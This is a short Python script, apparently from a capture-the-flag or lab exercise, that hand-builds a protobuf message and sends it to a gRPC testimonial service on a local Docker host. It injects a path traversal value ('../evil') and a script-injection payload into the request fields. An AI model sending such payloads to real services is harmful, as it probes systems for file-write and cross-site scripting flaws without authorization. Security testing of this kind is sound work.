import httpx
import struct

def varint_encode(value):
    """Encode a non-negative integer as a varint."""
    buf = []
    while value > 0x7f:
        buf.append((value & 0x7f) | 0x80)
        value >>= 7
    buf.append(value & 0x7f)
    return bytes(buf)

def encode_string_field(field_number, string_val):
    """Protobuf encode a string field."""
    data = string_val.encode('utf-8')
    tag = varint_encode((field_number << 3) | 2)  # wire type 2 = length-delimited
    return tag + varint_encode(len(data)) + data

def build_grpc_request(customer, testimonial):
    """Build a gRPC HTTP/2 request body with 5-byte prefix."""
    msg = encode_string_field(1, customer) + encode_string_field(2, testimonial)
    return b'\x00' + struct.pack('>I', len(msg)) + msg

def main():
    target = 'http://host.docker.internal:50045/main.TestimonialService/SubmitTestimonial'
    headers = {
        'content-type': 'application/grpc',
        'te': 'trailers',
        'grpc-timeout': '5S'
    }
    body = build_grpc_request('../evil', '<script>alert(1)</script>')
    with httpx.Client(http2=True, verify=False) as client:
        try:
            r = client.post(target, headers=headers, content=body, timeout=10.0)
            print(f'Status: {r.status_code}')
            print('Response body:', r.content)
        except Exception as e:
            print(f'Request failed: {e}')

if __name__ == '__main__':
    main()

